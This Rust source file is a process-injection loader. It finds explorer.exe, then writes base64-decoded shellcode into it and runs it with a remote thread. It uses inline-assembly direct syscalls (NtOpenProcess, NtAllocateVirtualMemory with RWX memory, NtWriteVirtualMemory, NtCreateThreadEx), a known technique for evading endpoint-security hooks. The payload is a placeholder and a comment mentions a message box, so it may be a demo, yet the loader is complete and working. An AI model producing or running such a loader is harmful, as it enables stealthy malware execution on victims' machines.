
use std::mem;
use core::arch::global_asm;
use windows::{
    Win32::System::Diagnostics::ToolHelp::*,
    Win32::Foundation::*,
};
use windows_sys::Win32::System::Threading::{PROCESS_ALL_ACCESS};
use windows_sys::Win32::System::WindowsProgramming::{CLIENT_ID, OBJECT_ATTRIBUTES};
use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
use windows_sys::Win32::Foundation::{HANDLE, NTSTATUS};
use base64::Engine;
use base64::engine::general_purpose;

mod syscall;

global_asm!(r#"
.global asm_nt_open_process
asm_nt_open_process:
    mov r10, rcx
    mov eax, [rsp + 0x28]
    syscall
    ret

.global asm_nt_allocate_virtual_memory
asm_nt_allocate_virtual_memory:
    mov r10, rcx
    mov eax, [rsp + 0x38]
    syscall
    ret

.global asm_nt_write_virtual_memory
asm_nt_write_virtual_memory:
    mov r10, rcx
    mov eax, [rsp + 0x30]
    syscall
    ret

.global asm_nt_create_thread_ex
asm_nt_create_thread_ex:
    mov r10, rcx
    mov eax, [rsp + 0x60]
    syscall
    ret

.global asm_nt_close
asm_nt_close:
    mov r10, rcx
    mov eax, edx
    syscall
    ret
"#);

extern "C" {
    fn asm_nt_open_process(ProcessHandle: &mut HANDLE, DesiredAccess: u32, ObjectAttributes: &mut OBJECT_ATTRIBUTES, ClientId: &mut CLIENT_ID, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_allocate_virtual_memory(ProcessHandle: HANDLE, BaseAddress: &mut *mut std::ffi::c_void, ZeroBits: u32, RegionSize: &mut usize, AllocationType: u32, Protect: u32, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_write_virtual_memory(ProcessHandle: HANDLE, BaseAddress: *mut std::ffi::c_void, Buffer: *const std::ffi::c_void, NumberOfBytesToWrite: usize, NumberOfBytesWritten: &mut usize, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_create_thread_ex(ThreadHandle: &mut HANDLE, DesiredAccess: u32, ObjectAttributes: *mut OBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: *mut std::ffi::c_void, Argument: *mut std::ffi::c_void, CreateFlags: u32, ZeroBits: usize, StackSize: usize, MaximumStackSize: usize, AttributeList: *mut std::ffi::c_void, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_close(Handle: HANDLE, syscall_id: u32) -> NTSTATUS;
}

const ENCODED_SHELLCODE: &str = "base64_encoded_SHELLCODE_REPLACE";

fn get_explorer_pid() -> Option<u32> {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0).unwrap();
        if snapshot.is_invalid() {
            return None;
        }

        let mut process_entry: PROCESSENTRY32 = mem::zeroed();
        process_entry.dwSize = mem::size_of::<PROCESSENTRY32>() as u32;

        if Process32First(snapshot, &mut process_entry).as_bool() {
            loop {
                let end = process_entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(260);
                let bytes = std::slice::from_raw_parts(process_entry.szExeFile.as_ptr() as *const u8, end);
                let process_name = String::from_utf8_lossy(bytes);
                if process_name == "explorer.exe" {
                    CloseHandle(snapshot);
                    return Some(process_entry.th32ProcessID);
                }

                if !Process32Next(snapshot, &mut process_entry).as_bool() {
                    break;
                }
            }
        }
        CloseHandle(snapshot);
    }
    None
}

fn main() {
    let shellcode = general_purpose::STANDARD.decode(ENCODED_SHELLCODE).unwrap();

    // 1. Get explorer.exe PID
    let explorer_pid = get_explorer_pid().expect("Failed to find explorer.exe PID.");
    println!("Found explorer.exe PID: {}", explorer_pid);

    // 2. Open a handle to the process
    let mut process_handle: HANDLE = 0;
    let mut object_attributes: OBJECT_ATTRIBUTES = unsafe { mem::zeroed() };
    let mut client_id: CLIENT_ID = unsafe { mem::zeroed() };
    client_id.UniqueProcess = explorer_pid as _;

    let nt_open_process_syscall = syscall::get_syscall_number("NtOpenProcess")
        .expect("Failed to get syscall number for NtOpenProcess");

    let status = unsafe {
        asm_nt_open_process(
            &mut process_handle,
            PROCESS_ALL_ACCESS,
            &mut object_attributes,
            &mut client_id,
            nt_open_process_syscall,
        )
    };

    if status != 0 {
        panic!("NtOpenProcess failed with status: {:#x}", status);
    }
    println!("Successfully opened a handle to explorer.exe.");

    // 3. Allocate memory
    let mut alloc_addr: *mut std::ffi::c_void = std::ptr::null_mut();
    let mut size = shellcode.len();
    let nt_allocate_virtual_memory_syscall = syscall::get_syscall_number("NtAllocateVirtualMemory")
        .expect("Failed to get syscall number for NtAllocateVirtualMemory");

    let status = unsafe {
        asm_nt_allocate_virtual_memory(
            process_handle,
            &mut alloc_addr,
            0,
            &mut size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
            nt_allocate_virtual_memory_syscall,
        )
    };

    if status != 0 {
        panic!("NtAllocateVirtualMemory failed with status: {:#x}", status);
    }
    println!("Successfully allocated memory at {:?}", alloc_addr);

    // 4. Write shellcode to the allocated memory
    let mut bytes_written = 0;
    let nt_write_virtual_memory_syscall = syscall::get_syscall_number("NtWriteVirtualMemory")
        .expect("Failed to get syscall number for NtWriteVirtualMemory");

    let status = unsafe {
        asm_nt_write_virtual_memory(
            process_handle,
            alloc_addr,
            shellcode.as_ptr() as *const _,
            shellcode.len(),
            &mut bytes_written,
            nt_write_virtual_memory_syscall,
        )
    };

    if status != 0 {
        panic!("NtWriteVirtualMemory failed with status: {:#x}", status);
    }
    println!("Successfully wrote shellcode.");

    // 5. Create a remote thread to execute the shellcode
    let mut thread_handle: HANDLE = 0;
    let nt_create_thread_ex_syscall = syscall::get_syscall_number("NtCreateThreadEx")
        .expect("Failed to get syscall number for NtCreateThreadEx");

    let status = unsafe {
        asm_nt_create_thread_ex(
            &mut thread_handle,
            PROCESS_ALL_ACCESS,
            std::ptr::null_mut(),
            process_handle,
            alloc_addr,
            std::ptr::null_mut(),
            0,
            0,
            0,
            0,
            std::ptr::null_mut(),
            nt_create_thread_ex_syscall,
        )
    };

    if status != 0 {
        panic!("NtCreateThreadEx failed with status: {:#x}", status);
    }
    println!("Successfully created a remote thread. Check for a message box!");

    // 6. Close handles
    let nt_close_syscall = syscall::get_syscall_number("NtClose")
        .expect("Failed to get syscall number for NtClose");

    unsafe {
        asm_nt_close(thread_handle, nt_close_syscall);
        asm_nt_close(process_handle, nt_close_syscall);
    }
}
